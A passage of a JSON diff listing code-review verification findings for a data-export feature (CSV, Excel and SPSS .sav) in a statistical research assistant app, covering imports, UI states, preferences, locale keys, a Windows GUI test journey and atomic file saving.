+    "Lazy import: pyreadstat is imported only inside functions (data_export.py:930 and 1368, data_loader.py:647). The static module-level import closure of app, research_app and workspace_shell is identical between base and tip: 92 local modules, the same external set, and no pyreadstat, openpyxl or export modules at startup. Importing workspace_export from DataPage.__init__ costs 0.4 ms. The first card render imports data_export (about 5 ms) without loading pyreadstat or openpyxl.",
+    "Export card: one ExportPanel per page instance, created in each page's __init__, so its state survives renders. The card has no text field, and the Data page's import fields only store values, so nothing re-renders while typing. Advanced options sit in wc.expansion with an empty opened set: collapsed, and kept across renders. The card uses only Button, Dropdown, Checkbox and ExpansionTile (keyboard-focusable); there are no clickable Containers, and `disabled` appears 0 times in workspace_export.py.",
+    "Blocked states, checked in memory: with no data the button is present and enabled and an export-blocked notice is shown; pressing it gives 'Open a dataset to export it.' and opens no Save dialog. No sheet selected gives 'Choose at least one sheet…'; no results gives 'There are no results to export yet…'. No UI test covers these blocked states; that is a coverage gap only.",
+    "Remembered choices: stored in the same ~/.statistical_research_assistant/preferences.json as app_preferences.preferences_path(). Both writers (save_preferences via _other_keys, and remember_export) keep the 'export' block. An invalid context/format combination falls back to the default.",
+    "Codebook cache invalidates correctly: VariableInfo is frozen and replaced on change, so the cache key changes. My first suspicion of a stale cache was an error in my own probe.",
+    ".sav preview robustness: plan_sav and build_codebook raised nothing across 22 unusual column types: nullable Int64 and boolean, ±inf, integers above 2^53, Decimal, timedelta, time-zone datetimes, date/time objects, categoricals with NaN, mixed objects, all-NaN, empty texts, 40,000-character texts, bytes, complex, Period, Interval, and reserved or invalid names. All 14 export.change.* messages and the card's own t() calls supply every placeholder used in EN, LV and RU, so build() cannot raise a KeyError.",
+    "Locale audit on the tip: missing 0 and placeholder 0 (--strict exits 0). Texts grew from 2,211 to 2,282 (+71). workspace_text.T grew from 1,348 to 1,419 keys with 0 removed and 0 changed, every new key under export.* or data.opt.user_missing*; LABELS and PLURALS are unchanged. The 3 new 'length' findings are the RU 'Экспортировать .xxx…' buttons, a layout-risk category that is not a gate.",
+    "Windows journey export-data: it uses the same click → file_dialog(save=True) → wait_text(target.name) sequence as save_via_dialog, then waits for the 'Saved and checked' prefix, which export.saved and export.saved_csv share. Each run gets a fresh temp work folder and main() deletes preferences.json. USERPROFILE is passed through, so driver and program share Path.home(). Files are checked on disk with independent readers (worksheet XML searched for <f>, openpyxl, pyreadstat, pandas plus the codebook's SHA-256). The fixture's names are SPSS-valid and participant_code is FAKE_0001, so _same_cell is consistent. The 'Format' dropdown is matched by its exact, unique UIA name. The journey is not in STARTS_ITSELF, and the workflow runs all journeys (no --only).",
+    "Workflow: only windows-gui-e2e.yml changed; the added paths are exact file names that exist, and workspace_export.py is already covered by workspace_*.py.",
+    "The existing responses journey is unaffected by the D8 guard: protect_frame only prefixes dangerous text cells, and the journey's checks (4 lines, 'stress_q1', JSON codebook) still hold. The codebook is written after the CSV, for the final path; exported_codebook vouches by SHA-256 and rule.",
+    "save_atomic matches doc §5.3 (.<stem>.<hex>.partial<ext>, verify, fsync, os.replace, size and SHA re-check), and export_csv writes its sidecar for the final file name and SHA-256.",
+    "Project format: SCHEMA_VERSION is 6 at both base and tip. Labels go in variables.label; value labels and missing codes go in a 'sra-variable-metadata' JSON document in datasets.notes, and the save is refused when notes hold other text. The 0b and rag branches do not touch notes or label.",
+    "docs/STAGE37_EXPORT.md claims that hold: 71 keys with none changed; 50 pins, 26 hashes and the via lines; the dependencies; the cp312 hash; the licences; the sizes; test counts 7/4/26/10/3 = 50; progress every 0.5 s and every 2,000 rows; the default format per page; semicolon by default in LV/RU; the path-filter list; both locks installed by the GUI toolchain action; the journey appended after the 18 with their order unchanged."
+   ]
+  }
+ }
+}
